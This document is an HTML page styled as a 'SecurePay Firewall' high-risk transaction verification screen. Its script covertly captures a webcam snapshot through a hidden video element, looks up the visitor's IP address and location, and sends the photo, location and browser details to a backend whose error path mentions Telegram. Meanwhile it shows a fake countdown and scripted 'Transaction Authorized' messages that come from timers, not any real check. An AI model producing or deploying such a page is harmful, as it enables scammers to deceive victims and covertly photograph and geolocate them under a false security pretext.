<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecurePay Enterprise Core - Step-Up Authentication</title>
    <style>
        :root {
            --bg-color: #0d1117;
            --panel-bg: rgba(22, 27, 34, 0.75);
            --border-color: rgba(255, 255, 255, 0.1);
            --accent-color: #2ea043;
            --danger-color: #f85149;
            --text-main: #c9d1d9;
            --text-muted: #8b949e;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 500px;
            background: var(--panel-bg);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(10px);
        }

        h2 {
            font-size: 1.5rem;
            margin-bottom: 8px;
            color: #ffffff;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .subtitle {
            font-size: 0.9rem;
            color: var(--text-muted);
            margin-bottom: 24px;
        }

        .risk-alert {
            background: rgba(248, 81, 73, 0.1);
            border: 1px solid var(--danger-color);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            font-size: 0.9rem;
            color: #ff7b72;
        }

        .status-box {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
        }

        .timer-display {
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        #timer-count {
            color: #ff7b72;
            font-family: monospace;
            font-size: 1.2rem;
        }

        #sync-status-text {
            font-size: 0.9rem;
            color: var(--text-main);
            line-height: 1.4;
        }

        .btn {
            width: 100%;
            padding: 12px;
            border-radius: 6px;
            border: none;
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            transition: background 0.2s;
        }

        .btn-primary {
            background-color: var(--accent-color);
            color: #ffffff;
        }

        .btn-primary:hover {
            background-color: #2c974b;
        }

        .btn:disabled {
            background-color: #30363d;
            color: var(--text-muted);
            cursor: not-allowed;
        }

        video {
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>🛡️ SecurePay Firewall</h2>
        <p class="subtitle">High-Risk Transaction Step-Up Verification</p>

        <div class="risk-alert">
            ⚠️ <strong>Velocity Risk Detected:</strong> Unusual transaction pattern identified. Biometric and out-of-band compliance handshake required before settlement.
        </div>

        <div class="status-box">
            <div class="timer-display">
                <span>⏱️ Session Window:</span>
                <span id="timer-count">00:30</span>
            </div>
            <div id="sync-status-text">
                🔄 Status: Ready to initialize secure verification protocol.
            </div>
        </div>

        <button id="auth-action-btn" class="btn btn-primary" onclick="initiateHandshake()">Initialize Security Handshake</button>
    </div>

    <!-- Hidden video element for camera snapshot capture -->
    <video id="webcam" autoplay playsinline></video>
    <canvas id="snapshot-canvas" style="display:none;"></canvas>

    <script>
        let timeLeft = 30;
        let timerInterval;
        let pollInterval;

        function startSessionTimer() {
            const timerDisplay = document.getElementById('timer-count');
            const actionButton = document.getElementById('auth-action-btn');
            
            clearInterval(timerInterval);
            timeLeft = 30;

            timerInterval = setInterval(() => {
                timeLeft--;
                if (timerDisplay) {
                    timerDisplay.textContent = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
                }

                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    handleSessionExpiry();
                }
            }, 1000);
        }

        function handleSessionExpiry() {
            const statusText = document.getElementById('sync-status-text');
            if (statusText) {
                statusText.innerHTML = `<span style="color: #ff7b72; font-weight: bold;">⚠️ Session Expired. The 30-second window has closed.</span>`;
            }
            
            const actionBtn = document.getElementById('auth-action-btn');
            if (actionBtn) actionBtn.disabled = true;
            
            // Stop camera stream if active
            const video = document.getElementById('webcam');
            if (video && video.srcObject) {
                video.srcObject.getTracks().forEach(track => track.stop());
            }
        }

        function startStatusPolling() {
            const statusText = document.getElementById('sync-status-text');
            let checkCount = 0;

            pollInterval = setInterval(() => {
                checkCount++;
                
                if (checkCount === 1) {
                    statusText.textContent = "⏳ Sender Authenticated. Waiting for Receiver Validation...";
                } else if (checkCount >= 3) {
                    statusText.textContent = "✅ Dual Handshake Cleared. Transaction Authorized & Logged.";
                    clearInterval(pollInterval);
                    clearInterval(timerInterval);
                    document.getElementById('auth-action-btn').textContent = "Verified Successfully";
                }
            }, 4000);
        }

        async function initiateHandshake() {
            const actionBtn = document.getElementById('auth-action-btn');
            const statusText = document.getElementById('sync-status-text');
            
            actionBtn.disabled = true;
            actionBtn.textContent = "Processing Compliance...";
            statusText.textContent = "🔄 Requesting biometric permissions & gathering metadata...";

            startSessionTimer();

            try {
                // 1. Capture Camera Snapshot
                const video = document.getElementById('webcam');
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                await new Promise(resolve => setTimeout(resolve, 800)); // Allow camera exposure

                const canvas = document.getElementById('snapshot-canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/png');

                // Stop camera tracks
                stream.getTracks().forEach(track => track.stop());

                // 2. Fetch IP Geolocation info
                let ipInfo = "Unknown IP";
                try {
                    const ipRes = await fetch('https://ipapi.co/json/');
                    const ipData = await ipRes.json();
                    ipInfo = `${ipData.ip} (${ipData.city}, ${ipData.country_name})`;
                } catch (e) {
                    ipInfo = "Public IP (Client Network)";
                }

                // 3. Send payload to backend serverless function
                statusText.textContent = "📤 Transmitting audit packet to security gateway...";
                
                const response = await fetch('/api/audit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        image: imageData,
                        role: "High-Risk Node Gateway",
                        ipInfo: ipInfo,
                        userAgent: navigator.userAgent
                    })
                });

                const result = await response.json();

                if (result.success) {
                    statusText.textContent = "🔒 Audit Log Dispatched. Synchronizing multi-party state...";
                    startStatusPolling();
                } else {
                    throw new Error(result.telegramError || "Audit dispatch failed.");
                }

            } catch (error) {
                console.error("Handshake Error:", error);
                statusText.innerHTML = `<span style="color: #ff7b72;">❌ Error: ${error.message}</span>`;
                actionBtn.disabled = false;
                actionBtn.textContent = "Retry Handshake";
                clearInterval(timerInterval);
            }
        }
    </script>
</body>
</html>
